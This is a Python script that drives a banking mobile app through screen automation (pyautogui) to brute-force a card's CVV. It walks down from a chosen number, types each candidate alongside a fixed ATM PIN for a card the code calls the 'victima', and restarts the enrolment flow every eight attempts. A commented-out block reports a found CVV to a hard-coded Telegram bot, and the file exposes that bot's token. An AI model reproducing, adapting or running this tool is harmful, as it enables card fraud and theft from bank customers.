import pyautogui as robot
import time 
import telegram

afiliacion = 119,229 # Afiliar celular segguro
#afiliacion = 125,361 #  afiliar ma´s abajo

Ndocumento = 421,379
Ntarjeta = 421, 445 
Nclavecajero = 421,628
CVV = 421,533
Continuar1 = 284,721
reintentar = 284,957
#reintentar = 1637,984
escape = 544,76

# Este es miooo de Hasen
# no compartir por error, si eres alguien tmre me descuide 
bot_token = '5269439351:AAHgei8HJ94-pRaZI7gfSeKlghZmY91RAL4'
chat_id = '1850445278'
bot = telegram.Bot(token=bot_token)

#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

victima_tar = ""
victima_dni = ""
victima_pasw = "2303"
# 
#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir datos

print("El programa trabaja de manera descendente 999...998...997...")
print("Programa de Hasen")
inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))
print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

#def logeo ():
#	abrir(afiliacion,click=1)
#	time.sleep(2)
#	abrir(262,418) # Abrir menu de tarjetas
#	time.sleep(0.5)
#	abrir(293,587) # Selecionar posicion de tarjeta ( este es el que cambia  más)




print(":D")


contador = 0 # para reiniciar 
inicio = inicio + 1



while inicio>fin :  # >  < # desde 999 para abajo
	
	inicio = inicio - 1
	contador += 1
	
	#print(contador)
	
	if contador > 8 : # Reiniciar 
		print("Reiniciando, esperar por favor")
		time.sleep(0.5) 
		robot.click(538,79)#salir
		time.sleep(1.5)

		#robot.click(149,365) # aabajo tokem
		#robot.click(124,230)# arrioba tokem
		robot.click(133,367) # afioliar celular seguro                                +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		time.sleep(0.4)
		robot.click(279,991) #empezar
		time.sleep(2.4)
		robot.click(493,332) # Abrir menu de tarjetas
		time.sleep(0.3)

		robot.click(176,502) # Elegir posicion de tarjeta

		time.sleep(0.3)

		print("Continuando...")
		contador=1
	

	#print("Intentado con: ",inicio)

	registro = open("registro.txt","a")
	registro.write(str(inicio)) # escribir en el block
	registro.write("\n")
	registro.close()
	 # Borar quizas
	print("Intentando con: ",inicio)


	time.sleep(0.3)
	
	#robot.click(529,393) #click en cvv
	#robot.click(529,393) #para ver los numeros
	time.sleep(0.2)
	robot.click(49,401) # para reemplazar
	robot.click(49,401)
	time.sleep(0.3)
	#por si son bajos de 100
	if inicio < 100:
		robot.typewrite("0")
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #######################
	else:
		robot.typewrite(str(inicio))
		time.sleep(0.1)
		#print("Tipeando") #########################
	#time.sleep(0.1)

	#llenando la clave de cajero:
	time.sleep(0.2)
	#robot.click(530,490) # ver ojo
	#robot.click(530,490)
	time.sleep(0.3)
	robot.click(42,492) # para reemplazar
	robot.click(42,492)
	robot.typewrite(str(victima_pasw))
	time.sleep(0.3)


	robot.click(282,586) #continuar
	time.sleep(0.4)

	# Para ver cuanto demora en cargar
	blanco =  False
	ceveve = False

	contadorEmergencia = 0
	while blanco is False :
		contadorEmergencia += 1
		blanco = robot.pixelMatchesColor(322,979,(35,122,186))
		#print("akjudhasjkd")
		#ceveve = robot.pixelMatchesColor(532,619,(212,237,252))
		time.sleep(0.1)

		if (blanco is True):
			print("!!")
			contadorEmergencia = 0
			time.sleep(0.1)
			robot.click(282,988)

		'''
		if (ceveve is True):
			print ('\a')
			bot.send_message(chat_id=chat_id, text = 'Cvv encontrado: '+ str(inicio))
			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()
		'''

		if contadorEmergencia == 40:
			print("Detenido por EMERGENCIA")
			#bot.send_message(chat_id=chat_id, text = 'Detenido, vaya a revisar')
			print("Enter para continuar")
			input()
			print("Repitiendo!")
			inicio = inicio + 1
			blanco = True	
	time.sleep(0.1)

	print("--------------------------------")
	input("Pasando al otro lado")
	time.sleep(0.3)
	robot.click(248,200)

	time.sleep(0.5)
#print("Intentado con: ",inicio)
print ('\a')

print("Enter para finalizar")
input()




